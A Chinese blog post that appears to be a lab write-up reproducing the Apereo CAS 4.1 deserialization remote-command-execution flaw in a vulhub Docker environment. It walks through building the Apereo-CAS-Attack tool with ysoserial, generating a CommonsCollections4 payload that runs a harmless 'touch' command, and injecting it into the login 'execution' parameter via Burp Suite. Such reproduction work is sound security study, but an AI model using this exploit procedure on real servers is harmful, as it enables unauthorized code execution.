
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/congyou/p/19008751" title="发布于 2025-07-28 19:35">
    <span role="heading" aria-level="2">Apereo CAS 4.1 反序列化命令执行漏洞 (复现)</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        
        记Apereo CAS 4.1 反序列化命令执行漏洞 (复现)
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p>此漏洞需要用到工具Apereo-CAS-Attack，工具地址：<a href="" rel="noopener nofollow">https://github.com/vulhub/Apereo-CAS-Attack</a><br>
还需要下载结合<a href="ysoserial" target="_blank" rel="noopener nofollow">https://github.com/frohoff/ysoserial</a>的CommonsCollections4链生成 Payload<br>
上述工具下载完成后将ysoserial放在工具的根目录里<br>
<img src="https://img2024.cnblogs.com/blog/3680810/202507/3680810-20250728191244988-1481399333.png" alt="image" loading="lazy"></p>
<p>在根目录下打开终端执行以下命令将 jar 包安装到本地 Maven 仓库</p>
<details>
<summary>点击查看代码</summary>
<pre><code>mvn org.apache.maven.plugins:maven-install-plugin:2.5.2:install-file \
  -Dfile=ysoserial-all.jar \
  -DgroupId=ysoserial \
  -DartifactId=ysoserial \
  -Dversion=0.0.6 \
  -Dpackaging=jar \
  -DlocalRepositoryPath=my-repo
</code></pre>
</details>
<p><img src="https://img2024.cnblogs.com/blog/3680810/202507/3680810-20250728191803373-1196798118.png" alt="image" loading="lazy"></p>
<p>命令成功执行！！！<br>
ysoserial会被安装到项目根目录的my-repo文件夹中，供 Maven 构建时引用<br>
执行以下命令安装项目所需环境</p>
<details>
<summary>点击查看代码</summary>
<pre><code># 更新包列表
sudo apt update

# 安装OpenJDK 8
sudo apt install openjdk-8-jdk -y

# 同样配置javac（编译器）
sudo update-alternatives --config javac
# 选择OpenJDK 8对应的javac路径

#执行以下代码
javac -version
若返回类似javac 1.8.0_xxx，说明 JDK 安装成功
</code></pre>
</details>
<p><img src="https://img2024.cnblogs.com/blog/3680810/202507/3680810-20250728192645350-1604077267.png" alt="image" loading="lazy"></p>
<p>执行代码<code>mvn clean package assembly:single -DskipTests</code>构建项目<br>
<img src="https://img2024.cnblogs.com/blog/3680810/202507/3680810-20250728193122933-93798430.png" alt="image" loading="lazy"></p>
<p>执行成功示图如上，接下来就可以使用该工具生成payload了</p>
<p>漏洞目录终端下执行<code>docker compose up -d</code>开启容器访问ip:8080<br>
<img src="https://img2024.cnblogs.com/blog/3680810/202507/3680810-20250728184738578-714171650.png" alt="image" loading="lazy"></p>
<p>生成恶意 Payload<br>
利用漏洞工具<code>Apereo-CAS-Attack（集成了默认密钥和序列化逻辑）</code>生成加密后的恶意序列化数据<br>
<code>java -jar target/apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "touch /tmp/cas_exploit_success"</code><br>
生成 Payload（利用反序列化执行 touch /tmp/cas_exploit_success）<br>
<img src="https://img2024.cnblogs.com/blog/3680810/202507/3680810-20250728185045182-1458276099.png" alt="image" loading="lazy"></p>
<p>工具会输出一段 Base64 编码的长字符串；</p>
<p>接下来请出bp(burpsuite)抓包<br>
网站首页使用测试账密test/test，输入后不要登陆！！！<br>
回到bp点击proxy启动代理（浏览器也需要挂上bp的代理），点击登录开始抓包<br>
<img src="https://img2024.cnblogs.com/blog/3680810/202507/3680810-20250728185416697-1102628730.png" alt="image" loading="lazy"></p>
<p>鼠标右键点击那条POST命令<code>send to repeater</code>，切换到repeater界面<br>
<img src="https://img2024.cnblogs.com/blog/3680810/202507/3680810-20250728185629597-1993652850.png" alt="image" loading="lazy"></p>
<p>将第一步生成的Base64编码替换成execution参数的内容<br>
<img src="https://img2024.cnblogs.com/blog/3680810/202507/3680810-20250728185833123-1031695916.png" alt="image" loading="lazy"></p>
<p>点击<code>Send</code>，收到状态码500，不确定漏洞复现没，验证一下<br>
<code>java -jar target/apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "touch /tmp/cas_exploit_success"</code><br>
此命令是在服务器的/tmp目录下创建文件，只需要访问服务器这个位置查看是否成功创建文件即可验证是否成功<br>
<img src="https://img2024.cnblogs.com/blog/3680810/202507/3680810-20250728190221941-1054672224.png" alt="image" loading="lazy"></p>
<p>文件创建成功，该漏洞成功复现！！！</p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2025-07-28 19:35">2025-07-28 19:35</span>&nbsp;
<a href="https://www.cnblogs.com/congyou">小小葱油</a>&nbsp;
阅读(<span id="post_view_count">60</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19008751);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19008751', targetLink: 'https://www.cnblogs.com/congyou/p/19008751', title: 'Apereo CAS 4.1 反序列化命令执行漏洞 (复现)' })">举报</a>
</div>
        